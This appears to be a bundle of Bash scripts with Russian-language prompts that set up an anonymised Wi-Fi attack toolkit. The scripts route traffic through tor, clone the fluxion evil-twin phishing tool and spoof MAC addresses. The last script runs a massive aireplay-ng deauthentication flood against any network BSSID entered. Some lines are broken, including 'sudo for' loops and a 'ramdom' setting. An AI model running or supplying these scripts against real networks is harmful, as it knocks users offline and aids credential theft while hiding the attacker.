
#!/bin/bash

cd

apt update
apt upgrade
apt full-upgrade

apt install leafpad
echo "[connection]"
echo "wifi.cloned-mac-address=random"
echo ""
echo "[connection]"
echo "ethernet.cloned-mac-address=ramdom"
leafpad /etc/NetworkManager/NetworkManager.conf

sudo service network-manager restart

echo "Введите любое слово, когда появится интернет"
read null

apt install tor
sudo systemctl start tor
git clone https://github.com/ruped24/toriptables2
git clone https://github.com/Ananac0/AnanacScript
git clone https://github.com/FluxionNetwork/fluxion
sudo systemctl start tor
cd toriptables2
sudo mv toriptables2.py /usr/local/bin

apt update
apt upgrade
apt full-upgrade

cd




#!/bin/bash

cd

apt install python-pip
apt install python3-pip

apt update
apt upgrade
apt full-upgrade

sudo for i in $(pip2 list -o | awk 'NR > 3 {print $1}'); do sudo pip2 install -U $i; done
sudo for i in $(pip3 list -o | awk 'NR > 2 {print $1}'); do sudo pip3 install -U $i; done

apt update
apt upgrade
apt full-upgrade

cd






















#!/bin/bash

echo -e "\e[41mВведите название адаптера для смены MAC-Address:\e[0m"
read DeviceName

echo -e "\e[41mSwich MAC-Address random: Start...\e[0m"

sudo airmon-ng stop wlan0mon

sudo ifconfig wlan0 down
echo -e "\e[41m$DeviceName отключен.\e[0m"

echo -e "\e[41m$DeviceName сменил MAC-Address:\e[0m"
sudo macchanger -r $DeviceName

sudo ifconfig wlan0 up
echo -e "\e[41m$DeviceName включен.\e[0m"

sudo service network-manager restart
echo -e "\e[41mСервис network-manager перезапущен.\e[0m"

echo -e "\e[41mГотово!\e[0m"





















#!/bin/bash

echo -e "\e[41mВведите название адаптера:\e[0m"
read DeviceName

echo -e "\e[41mВведите название адаптера + mon\e[0m"
read DeviceNameMon

echo -e "\e[41mОтключаем ненужные процессы...\e[0m"
sudo airmon-ng check kill

echo -e "\e[41mПеревод $DeviceName в режим мониторинга...\e[0m"
sudo airmon-ng start $DeviceName

echo -e "\e[41mВведите BSSID сети:\e[0m"
read BSSID

echo -e "\e[41mВведите канал сети:\e[0m"
read Channel

echo -e "\e[41mСмена канала...\e[0m"
sudo iwconfig $DeviceNameMon channel $Channel

echo -e "\e[41mЗапуск деаунтификатора...\e[0m"
sudo aireplay-ng --deauth 10000000 -a $BSSID $DeviceNameMon
